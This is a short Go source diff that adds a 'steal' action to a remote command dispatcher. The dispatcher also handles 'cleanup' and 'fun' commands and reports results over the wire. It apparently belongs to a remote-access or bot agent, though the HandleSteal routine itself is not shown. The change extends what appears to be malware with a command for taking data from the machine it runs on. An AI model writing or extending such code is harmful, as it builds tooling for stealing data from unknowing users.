@@ -1832,6 +1832,8 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return HandleCleanup(ctx, env, cmdID)
 	case "fun":
 		return HandleFun(ctx, env, cmdID, envelope)
+	case "steal":
+		return HandleSteal(ctx, env, cmdID)
 	default:
 		log.Printf("command: unknown action=%s", action)
 		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "unknown command"}
